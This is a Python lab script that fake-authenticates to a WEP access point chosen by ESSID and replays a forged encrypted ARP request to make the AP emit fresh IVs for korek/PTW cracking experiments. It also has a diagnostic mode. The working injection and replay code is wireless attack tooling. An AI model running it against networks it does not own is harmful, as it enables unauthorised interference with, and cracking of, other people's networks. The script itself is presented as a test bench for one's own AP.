"""WEP lab: log into a WEP router to generate ARP IVs, and/or diagnose the replay loop.

A self-contained bench for WEP work (a starting point to copy for korek/PTW experiments):

  * TRAFFIC GENERATOR (--generate SECS): fake-auth, then replay a forged encrypted ARP
    on a loop so the AP keeps rebroadcasting fresh IVs -- handy for feeding a running
    wifit3 instance ON A SECOND CARD (one radio can't be claimed by two processes), or
    just to make a dead test router emit IVs without babysitting a phone's Wi-Fi UI.

  * DIAGNOSTIC (default): a staged one-shot -- passive RX, fake-auth, a short replay
    burst -- reporting what the RAW per-card RX stream heard (WlanInterface.register_rx_callback,
    before WlanArray._ingest): injects, AP ACKs to our TX, and the AP's fresh-IV echoes.

The target is found by ESSID: tune to --channel, watch beacons until the SSID appears
(5 s after the first beacon proves the radio is listening), then lock its BSSID. No
BSSID/SSID/key is baked in -- all come from the CLI.

Live TX against a network you do not own is illegal. Point this only at your own AP.

    uv run python scripts/wep_lab.py --essid myssid --channel 6 --pass abcde
    uv run python scripts/wep_lab.py --essid myssid --channel 6 --pass 6162636465 --generate 120
    uv run python scripts/wep_lab.py --essid myssid --channel 6 --pass abcde --no-active-monitor
"""
from __future__ import annotations

import argparse
import asyncio
import os
import string
import sys
import time
from collections import Counter
from pathlib import Path

_HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(_HERE.parent / "src"))

from wifit3.wlan.discovery import build_interfaces, close_interfaces  # noqa: E402
from wifit3.dot11.auth_assoc import auth_req, assoc_req  # noqa: E402
from wifit3.dot11.wep.crypto import arp_request_plaintext, wep_encrypt  # noqa: E402
from wifit3.dot11.packet import AuthPacket, AssocRespPacket, DeauthPacket  # noqa: E402

BROADCAST = b"\xff" * 6


def pick_interface(ifaces, card: str = ""):
    """The interface whose "<name> <description>" contains ``card`` (case-insensitive),
    or the first when ``card`` is blank; None (after printing the roster) on no match."""
    if not card:
        if len(ifaces) > 1:
            print(f"[!] {len(ifaces)} interfaces; using {ifaces[0].name}. "
                  f"Pass --card <substr> to pick another.")
        return ifaces[0] if ifaces else None
    matches = [i for i in ifaces if card.lower() in f"{i.name} {i.description}".lower()]
    if not matches:
        roster = ", ".join(f"{i.name} ({i.description})" for i in ifaces)
        print(f"[-] no card matches {card!r}. Found: {roster}")
        return None
    return matches[0]


def _mac(s: str) -> bytes:
    return bytes(int(x, 16) for x in s.split(":"))


def _macs(b: bytes) -> str:
    return ":".join(f"{x:02x}" for x in b)


def parse_wep_key(s: str) -> bytes:
    """A WEP key from --pass: hex (10/26 hex chars = 40/104-bit) or ASCII (5/13 chars).
    'abcde' -> ASCII 5 B; '6162636465' -> hex 5 B. Ambiguity resolved by length+charset."""
    is_hex = len(s) in (10, 26) and all(c in string.hexdigits for c in s)
    if is_hex:
        return bytes.fromhex(s)
    if len(s) in (5, 13):
        return s.encode("ascii")
    raise ValueError(f"--pass {s!r}: want 5/13 ASCII chars or 10/26 hex chars (40/104-bit WEP)")


def rc4_keystream(seed: bytes, n: int) -> bytes:
    """RC4 PRGA output for ``seed`` (WEP: seed = IV(3) ++ key). No drop bytes."""
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + seed[i % len(seed)]) & 0xFF
        S[i], S[j] = S[j], S[i]
    out = bytearray()
    i = j = 0
    for _ in range(n):
        i = (i + 1) & 0xFF
        j = (j + S[i]) & 0xFF
        S[i], S[j] = S[j], S[i]
        out.append(S[(S[i] + S[j]) & 0xFF])
    return bytes(out)


def forge_encrypted_arp(bssid: bytes, our_mac: bytes, key: bytes) -> bytes:
    """A valid WEP-encrypted broadcast ARP request, ToDS, sourced from ``our_mac``.

    Layout: [ToDS+Protected hdr 24][IV 3][KeyID 1][RC4(SNAP+ARP ++ ICV)] = 68 B.
    Encrypted with the real key so the AP decrypts it, sees a broadcast ARP from an
    associated STA, and rebroadcasts it under a FRESH IV -- the attack's whole point.
    """
    iv = bytes([0x3A, 0x17, 0x00])
    plaintext = arp_request_plaintext(
        sender_mac=our_mac,
        sender_ip=bytes([192, 168, 1, 123]),
        target_ip=bytes([192, 168, 1, 1]),
    )
    keystream = rc4_keystream(iv + key, len(plaintext) + 4)
    body = wep_encrypt(keystream, plaintext)
    hdr = (
        b"\x08\x41"            # Data, ToDS=1, Protected=1
        + b"\x00\x00"          # duration
        + bssid                # addr1 = BSSID (RA)
        + our_mac              # addr2 = us (TA/SA)
        + BROADCAST            # addr3 = broadcast (DA)
        + b"\x00\x00"          # seq (driver stamps)
    )
    return hdr + iv + bytes([0x00]) + body


class Tap:
    """Raw per-card RX classifier -- pre-_ingest ground truth for the WEP loop."""

    def __init__(self, bssid: bytes, our_mac: bytes):
        self.bssid = bssid
        self.our_mac = our_mac
        self.reset()

    def reset(self) -> None:
        self.beacons = 0
        self.auth_to_us = 0
        self.assoc_to_us = 0
        self.assoc_status = None
        self.deauth_to_us = 0
        self.wep_data_any = 0
        self.echoes = 0
        self.echo_ivs: set = set()
        self.other_wep_src: Counter = Counter()

    def __call__(self, pkt) -> None:
        raw = pkt.raw
        if not raw or len(raw) < 10:
            return
        fc0, fc1 = raw[0], raw[1]
        ftype = (fc0 >> 2) & 0x03

        if pkt.type == "beacon" and _mac((pkt.bssid or "00:00:00:00:00:00")) == self.bssid:
            self.beacons += 1
            return
        if len(raw) >= 10 and raw[4:10] == self.our_mac:
            if isinstance(pkt, AssocRespPacket):
                self.assoc_to_us += 1
                self.assoc_status = pkt.status
            elif isinstance(pkt, AuthPacket):
                self.auth_to_us += 1
            elif isinstance(pkt, DeauthPacket):
                self.deauth_to_us += 1
        if ftype == 2 and (fc1 & 0x40):     # data + Protected
            if _mac((pkt.bssid or "00:00:00:00:00:00")) == self.bssid:
                self.wep_data_any += 1
            if bool(fc1 & 0x02) and not bool(fc1 & 0x01) and raw[4:10] == BROADCAST:
                sa = raw[16:22]             # addr3 = original SA
                if sa == self.our_mac:
                    self.echoes += 1
                    if len(raw) >= 27:
                        self.echo_ivs.add(bytes(raw[24:27]))
                else:
                    self.other_wep_src[_macs(sa)] += 1


async def discover_bssid(iface, essid: str, channel: int, settle: float = 5.0,
                         hard_cap: float = 12.0) -> bytes | None:
    """Tune to ``channel`` and watch beacons until ``essid`` appears. The clock for the
    5 s search starts at the FIRST beacon of any AP (proof the radio is listening); no
    beacon at all within ``hard_cap`` means wrong channel / dead radio."""
    found: dict = {}
    first_beacon = [0.0]

    def cb(pkt) -> None:
        if pkt.type != "beacon":
            return
        if first_beacon[0] == 0.0:
            first_beacon[0] = time.monotonic()
        if pkt.ssid and pkt.ssid == essid and pkt.bssid:
            found.setdefault(pkt.ssid, pkt.bssid)

    iface.register_rx_callback(cb)
    try:
        if not await iface.set_channel(channel):
            print(f"[-] set_channel({channel}) failed")
            return None
        t0 = time.monotonic()
        print(f"[*] searching for ESSID {essid!r} on CH{channel}...")
        while True:
            await asyncio.sleep(0.1)
            if essid in found:
                bssid = found[essid]
                print(f"[+] found {essid!r} at {bssid}")
                return _mac(bssid)
            now = time.monotonic()
            if first_beacon[0] and now - first_beacon[0] > settle:
                print(f"[-] {essid!r} not seen {settle:g}s after first beacon on CH{channel}")
                return None
            if now - t0 > hard_cap:
                where = "no beacons at all (wrong channel / radio not listening)" \
                    if not first_beacon[0] else "essid not found"
                print(f"[-] gave up after {hard_cap:g}s: {where}")
                return None
    finally:
        iface.unregister_rx_callback(cb)


async def fake_auth(iface, tap: Tap, bssid: bytes, our_mac: bytes, essid: str,
                    active_monitor: bool) -> bool:
    if active_monitor:
        try:
            armed = await iface.set_fake_mac(our_mac, bssid)
            print(f"  active-monitor armed as {armed}")
        except Exception as e:  # noqa: BLE001
            print(f"  active-monitor FAILED (continuing): {e}")
    tap.reset()
    for attempt in range(3):
        await iface.send_no_wait(auth_req(bssid, our_mac))
        await asyncio.sleep(0.1)
        await iface.send_no_wait(assoc_req(bssid, our_mac, essid))
        t0 = time.time()
        while time.time() - t0 < 1.2:
            await asyncio.sleep(0.05)
            if tap.assoc_to_us and tap.assoc_status == 0:
                print(f"  associated (attempt {attempt + 1}, "
                      f"auth_resp={tap.auth_to_us} assoc_resp={tap.assoc_to_us})")
                return True
    print(f"  NOT associated (auth_resp={tap.auth_to_us} assoc_resp={tap.assoc_to_us} "
          f"status={tap.assoc_status} deauth={tap.deauth_to_us})")
    return False


async def run(iface, args, bssid: bytes) -> int:
    our_mac = bytes([0x02]) + os.urandom(5)
    tap = Tap(bssid, our_mac)
    iface.register_rx_callback(tap)
    frame = forge_encrypted_arp(bssid, our_mac, parse_wep_key(args.pass_))

    print("\n[Phase A] passive 6s (RX health)")
    tap.reset()
    await asyncio.sleep(6.0)
    print(f"  beacons: {tap.beacons} (~{tap.beacons / 6:.1f}/s)  "
          f"RX: {'OK' if tap.beacons else 'NO BEACONS'}")

    print(f"\n[Phase B] fake-auth as {_macs(our_mac)}"
          f"{'' if args.active_monitor else ' (no active-monitor)'}")
    try:
        await iface.enable_rx_acks()
    except Exception:  # noqa: BLE001
        pass
    if not await fake_auth(iface, tap, bssid, our_mac, args.essid, args.active_monitor):
        return 2

    drv = iface.driver
    if args.generate:
        print(f"\n[Phase C] GENERATE: replaying for {args.generate:g}s "
              f"(re-auth on deauth). Ctrl-C to stop.")
        end = time.time() + args.generate
        tap.reset()
        total_inj = 0
        last_report = time.time()
        while time.time() < end:
            await iface.send_no_wait(frame)
            total_inj += 1
            if total_inj % 20 == 0:
                await asyncio.sleep(0.005)   # brief yield so RX drains
            if tap.deauth_to_us:
                print("  deauthed -> re-associating")
                tap.deauth_to_us = 0
                await fake_auth(iface, tap, bssid, our_mac, args.essid, args.active_monitor)
            if time.time() - last_report >= 2.0:
                last_report = time.time()
                print(f"  injected={total_inj} echoes={tap.echoes} "
                      f"distinct_IVs={len(tap.echo_ivs)}")
        print(f"  DONE: injected={total_inj} echoes={tap.echoes} "
              f"distinct fresh IVs={len(tap.echo_ivs)}")
        return 0

    # One-shot diagnostic burst.
    print(f"\n[Phase C] diagnostic burst: {args.count} injects")
    tap.reset()
    ack_base = drv.acks_seen(our_mac)
    injected = 0
    for _ in range(args.count):
        await iface.send_no_wait(frame)
        injected += 1
        await asyncio.sleep(3.0 / max(1, args.count))
    await asyncio.sleep(1.5)
    acks = drv.acks_seen(our_mac) - ack_base
    print(f"  injected          : {injected}")
    print(f"  AP ACKs to our TX : {acks}  ({acks / max(1, injected):.1f}x/frame -> "
          f"{'retry storm' if acks > injected * 1.5 else 'clean 1:1'})")
    print(f"  AP echoes (fresh) : {tap.echoes}  distinct IVs: {len(tap.echo_ivs)}")
    print(f"  deauth to us      : {tap.deauth_to_us}")
    print(f"  card received {len(tap.echo_ivs)} fresh IV(s) from replay")
    return 0


async def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--essid", required=True, help="target SSID (found by beacon on --channel)")
    ap.add_argument("--channel", type=int, required=True, help="channel to tune to")
    ap.add_argument("--pass", dest="pass_", required=True, help="WEP key: ASCII or hex")
    am = ap.add_mutually_exclusive_group()
    am.add_argument("--active-monitor", dest="active_monitor", action="store_true", default=True,
                    help="arm HW auto-ACK for our MAC (default: on)")
    am.add_argument("--no-active-monitor", dest="active_monitor", action="store_false",
                    help="reproduce the campaign-faithful retry-storm case")
    ap.add_argument("--generate", type=float, default=0.0,
                    help="sustained-replay seconds (traffic generator); 0 = one-shot diagnostic")
    ap.add_argument("--count", type=int, default=60, help="one-shot burst inject count")
    ap.add_argument("--card", type=str, default="", help="adapter substring (default: first found)")
    args = ap.parse_args()

    parse_wep_key(args.pass_)   # validate early

    print("[*] Discovering interfaces...")
    ifaces = build_interfaces()
    iface = pick_interface(ifaces, args.card)
    if iface is None:
        await close_interfaces(ifaces)
        return 1

    def _progress(pct, msg):
        print(f"  [{int(pct * 100):3d}%] {msg}")

    print(f"[*] Bringing up {iface.description}...")
    try:
        if not await iface.connect(progress_cb=_progress):
            await close_interfaces(ifaces)
            return 1
    except Exception as e:  # noqa: BLE001
        print(f"[-] bring-up failed: {e}")
        await close_interfaces(ifaces)
        return 1
    print(f"[*] card MAC: {iface.mac_address}")

    rc = 1
    try:
        bssid = await discover_bssid(iface, args.essid, args.channel)
        if bssid is None:
            return 3
        rc = await run(iface, args, bssid)
    finally:
        try:
            if args.active_monitor:
                await iface.clear_fake_mac()
            await iface.disable_rx_acks()
        except Exception:  # noqa: BLE001
            pass
        await close_interfaces(ifaces)
    return rc


if __name__ == "__main__":
    try:
        raise SystemExit(asyncio.run(main()))
    except KeyboardInterrupt:
        print("\n[!] interrupted")
        raise SystemExit(130)
